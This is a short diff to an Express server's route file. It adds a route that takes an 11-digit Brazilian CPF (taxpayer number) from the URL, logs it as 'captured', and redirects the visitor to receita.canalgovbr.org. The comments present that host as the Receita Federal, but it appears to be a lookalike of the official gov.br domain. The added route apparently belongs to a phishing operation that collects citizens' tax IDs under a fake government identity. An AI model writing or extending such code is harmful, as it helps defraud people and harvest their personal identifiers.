@@ -5,6 +5,18 @@ import { domainValidationSchema } from "../shared/schema";
 import { ZodError } from "zod";
 
 export async function registerRoutes(app: Express): Promise<Server> {
+  // Rota específica para capturar CPF e redirecionar para Receita Federal
+  app.get('/:cpf(\\d{11})', (req, res) => {
+    const cpf = req.params.cpf;
+    console.log('CPF capturado no servidor:', cpf);
+    
+    // Redirecionar para Receita Federal
+    const receitaUrl = `https://receita.canalgovbr.org/${cpf}`;
+    console.log('Redirecionando para Receita Federal:', receitaUrl);
+    
+    return res.redirect(307, receitaUrl);
+  });
+
   // API endpoints for domain configuration
   app.get("/api/domains", async (req, res) => {
     try {
